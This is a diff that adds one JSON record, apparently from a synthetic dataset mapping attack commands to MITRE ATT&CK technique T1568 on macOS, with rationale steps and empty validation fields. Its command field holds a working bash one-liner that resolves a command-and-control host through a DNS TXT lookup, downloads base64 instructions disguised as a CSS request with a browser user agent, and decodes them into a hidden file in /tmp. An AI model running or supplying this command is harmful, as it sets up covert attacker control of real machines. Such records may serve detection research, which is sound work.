@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "c2host=$(dig +short TXT _c2.api-sync-mirror.net | tr -d '\"' | head -1); ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; [ -n \"$c2host\" ] && wget -qO- --user-agent=\"$ua\" --header=\"Accept: text/css,*/*;q=0.1\" --timeout=10 \"http://$c2host/styles/site.css\" | /usr/bin/base64 -D > /tmp/.dns_txt_cmd",
+  "explanation": "Leverages DNS TXT records to dynamically point to the active C2 hostname at runtime, then retrieves base64-encoded instructions via a benign-looking CSS path.",
+  "rationale_steps": [
+    "Query DNS TXT for the current C2 host (dynamic resolution).",
+    "Mimic static asset retrieval with realistic headers.",
+    "Decode C2 data from base64 into a local file."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-af57373f",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
